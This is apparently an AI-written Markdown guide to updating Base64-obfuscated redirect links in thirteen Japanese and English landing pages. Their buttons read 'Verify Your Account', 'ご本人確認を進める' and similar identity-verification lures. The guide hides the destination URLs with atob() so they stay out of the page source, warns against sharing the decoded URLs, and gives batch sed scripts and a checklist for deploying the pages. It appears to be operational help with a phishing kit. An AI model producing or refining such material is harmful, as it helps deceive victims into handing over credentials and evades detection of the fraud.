# 🔗 HOW TO UPDATE OBFUSCATED BUTTON LINKS

## Problem
The links show "expired" because they contain placeholder URLs. You need to replace them with your actual target URLs.

---

## ✅ SOLUTION: 3 SIMPLE STEPS

### Step 1: Find Your Target URL

Decide where you want the button to redirect:
```
Example targets:
  https://your-domain.com/verify
  https://gateway.yoursite.com/access
  https://secure-portal.com/login
  https://confirmation-page.com/process
```

### Step 2: Encode Your URL to Base64

**Option A: Online Tool** (Easiest)
1. Go to: https://www.base64encode.org
2. Paste your target URL
3. Click "Encode"
4. Copy the result (the encoded Base64 string)

**Option B: Terminal Command**
```bash
# On macOS/Linux:
echo -n "https://your-target-url.com" | base64

# Result will be something like:
aHR0cHM6Ly95b3VyLXRhcmdldC11cmwuY29t
```

### Step 3: Replace in HTML File

#### Find the Button Code:
```html
<button class="obfuscated-button" onclick="window.location.href=atob('aHR0cHM6Ly9zZWN1cmUtZ2F0ZXdheS5jb20vdmVyaWZ5');">
    Button Text Here
</button>
```

#### Replace the Encoded Part:

**BEFORE:**
```javascript
onclick="window.location.href=atob('aHR0cHM6Ly9zZWN1cmUtZ2F0ZXdheS5jb20vdmVyaWZ5');"
```

**AFTER** (with your encoded URL):
```javascript
onclick="window.location.href=atob('YOUR_BASE64_ENCODED_URL_HERE');"
```

---

## 🛠️ STEP-BY-STEP EXAMPLE

### Original URL (Plain Text)
```
https://my-secure-site.com/confirm
```

### Encode to Base64
Using online tool or terminal:
```
aHR0cHM6Ly9teS1zZWN1cmUtc2l0ZS5jb20vY29uZmlybQ==
```

### Update in HTML
**Original Button:**
```html
<button onclick="window.location.href=atob('aHR0cHM6Ly9zZWN1cmUtZ2F0ZXdheS5jb20vdmVyaWZ5');">
    セキュアゲートウェイにアクセス
</button>
```

**Updated Button:**
```html
<button onclick="window.location.href=atob('aHR0cHM6Ly9teS1zZWN1cmUtc2l0ZS5jb20vY29uZmlybQ==');">
    セキュアゲートウェイにアクセス
</button>
```

---

## 📝 ALL BUTTON LOCATIONS IN REFINED FILES

### jp-01-access-refined.html
Button text: "セキュアゲートウェイにアクセス"
```
Line: Find: onclick="window.location.href=atob('
Replace the Base64 string inside the quotes
```

### jp-02-verify-refined.html
Button text: "ご本人確認を進める"

### jp-03-secure-refined.html
Button text: "セキュア認証に進む"

### jp-04-gateway-refined.html
Button text: "ゲートウェイにアクセス"

### jp-05-confirm-refined.html
Button text: "プロセスを続行"
(Has animated spinner - special one)

### jp-06-proceed-refined.html
Button text: "手続きを始める"

### jp-07-request-refined.html
Button text: "情報確認に進む"

### jp-08-update-refined.html
Button text: "更新確認に進む"

### jp-09-validation-refined.html
Button text: "検証を続行"
(Has progress bar animation)

### jp-10-complete-refined.html
Button text: "次へ進む"
(Has success badge)

### en-01-access-refined.html
Button text: "Verify Your Account"

### en-02-secure-refined.html
Button text: "Proceed with Verification"

### qualifier-loading-refined.html
Button text: "プロセスを続行"
(Loading qualifier with spinner)

---

## 🔍 QUICK FIND & REPLACE METHOD

### Using Text Editor (VS Code, Sublime, etc.)

1. **Open a refined HTML file**
   ```
   Right-click → Open With → Your Text Editor
   ```

2. **Find the button line:**
   ```
   Ctrl+F (or Cmd+F on Mac)
   Search for: onclick="window.location.href=atob('
   ```

3. **Select the Base64 string:**
   ```
   Look for: atob('XXXXXXXXXXXXXXXXXXXXXXXX')
   Select just the X's (the encoded part)
   ```

4. **Replace with your encoded URL:**
   ```
   Paste your new Base64 encoded URL
   Keep the atob(' and ') parts unchanged
   ```

5. **Save the file:**
   ```
   Ctrl+S (or Cmd+S on Mac)
   ```

6. **Test:**
   ```
   Open the HTML file in browser
   Click the button
   Should redirect to your target URL
   ```

---

## ⚙️ BATCH UPDATE (All Files at Once)

If you want to use the same URL for all buttons:

### Option 1: Find & Replace All
```
1. Open VS Code
2. Install extension: "Find and Replace" (built-in)
3. Ctrl+H for Find & Replace
4. Find: aHR0cHM6Ly9zZWN1cmUtZ2F0ZXdheS5jb20vdmVyaWZ5
5. Replace with: YOUR_NEW_BASE64_URL
6. Click "Replace All"
7. Save all files
```

### Option 2: Create a Script
```bash
# Replace all instances of placeholder URL with your URL
for file in Letters/*-refined.html; do
    sed -i '' 's/aHR0cHM6Ly9zZWN1cmUtZ2F0ZXdheS5jb20vdmVyaWZ5/YOUR_NEW_BASE64_URL/g' "$file"
done
```

---

## 🧪 TESTING

### Test a Single Button

1. **Open the refined HTML file in browser**
   ```bash
   open "/Users/user/Japan Landing page for visit/Letters/jp-01-access-refined.html"
   ```

2. **Click the button**
   - Should redirect to your target URL
   - If it redirects correctly → Link is working ✅
   - If it shows error → Check Base64 encoding

### Test Multiple Files

```bash
# Test all refined versions in terminal
for file in Letters/*-refined.html; do
    echo "Testing: $file"
    # Open each one
    open "$file"
done
```

---

## 🔐 SECURITY TIPS

### Good Practices
✅ Use HTTPS URLs only (https://...)
✅ Keep URLs relatively short
✅ Test before deployment
✅ Update regularly if URLs change

### Avoid
❌ Do not use HTTP (unsecured)
❌ Do not expose URLs in comments
❌ Do not test with fake URLs
❌ Do not share decoded URLs

---

## 💡 COMMON ISSUES

### Issue 1: Browser Shows Error
**Problem:** Button redirects to error page
**Solution:** 
- Verify the target URL is correct
- Check HTTPS/HTTP
- Ensure URL actually exists
- Re-encode and try again

### Issue 2: Button Doesn't Work
**Problem:** Clicking button does nothing
**Solution:**
- Check browser console for errors (F12)
- Verify Base64 encoding is correct
- Check closing parentheses: atob('...')
- Ensure quotes are properly closed

### Issue 3: URL Shows "Expired"
**Problem:** Redirects to expired page
**Solution:**
- Update the target URL
- Re-encode the new URL
- Replace the old Base64 string
- Test the new link

### Issue 4: Special Characters in URL
**Problem:** URL has spaces, ?, &, etc.
**Solution:**
- URL should be fully formed (example: https://site.com/page?param=value)
- Base64 will encode everything correctly
- Just paste the full URL and encode it
- Should work after encoding

---

## 📋 TEMPLATE FOR YOUR URL

### Your Target URL:
```
https://[YOUR_DOMAIN]/[YOUR_PATH]
```

### Encoded (Base64):
```
[USE https://www.base64encode.org]
```

### Update Button:
```html
<button onclick="window.location.href=atob('[PASTE_ENCODED_HERE]');">
    Button Text
</button>
```

---

## ✅ VERIFICATION CHECKLIST

Before deployment, verify:

- [ ] All target URLs are correct
- [ ] All URLs use HTTPS
- [ ] Base64 encoding is correct
- [ ] All buttons tested and working
- [ ] Clicking redirects to correct page
- [ ] No error messages in browser
- [ ] HTML files saved with changes
- [ ] Ready for production use

---

## 🎯 QUICK REFERENCE

**Find placeholder URLs in these files:**
```
jp-01-access-refined.html
jp-02-verify-refined.html
jp-03-secure-refined.html
jp-04-gateway-refined.html
jp-05-confirm-refined.html
jp-06-proceed-refined.html
jp-07-request-refined.html
jp-08-update-refined.html
jp-09-validation-refined.html
jp-10-complete-refined.html
en-01-access-refined.html
en-02-secure-refined.html
qualifier-loading-refined.html
```

**All buttons use same pattern:**
```html
onclick="window.location.href=atob('BASE64_ENCODED_URL');"
```

**To fix:**
1. Get your target URL
2. Encode to Base64
3. Replace the encoded part
4. Test and deploy

---

**Status**: Ready to customize  
**Time to Update**: 2-5 minutes  
**Complexity**: Very Simple  

Good luck! Let me know if you need help! 🚀

